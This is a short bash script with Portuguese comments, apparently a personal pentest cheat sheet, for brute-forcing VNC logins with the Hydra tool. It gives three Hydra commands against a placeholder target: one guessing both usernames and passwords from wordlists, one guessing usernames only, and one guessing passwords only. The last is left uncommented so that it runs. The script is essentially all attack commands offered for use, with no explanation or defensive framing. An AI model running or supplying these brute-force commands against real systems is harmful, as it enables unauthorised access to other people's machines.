#! /bin/bash
#Autor: Joao Nossol
#github: https://github.com/joaonossolb

#Atacando serviços VNC com Hydra

#Realiza Brute Force no usuario e na senha
#hydra -L wordlistUsuarios.txt -P wordlistSenhas.txt -v <TARGET> vnc

#Realiza Brute force apenas no usuario
#hydra -L wordlistUsuarios.txt -p senha que eu sei -v <TARGET> vnc

#Realiza Brute force apenas na senha
hydra -l usuario -P wordlistSenhas.txt -v <TARGET> vnc

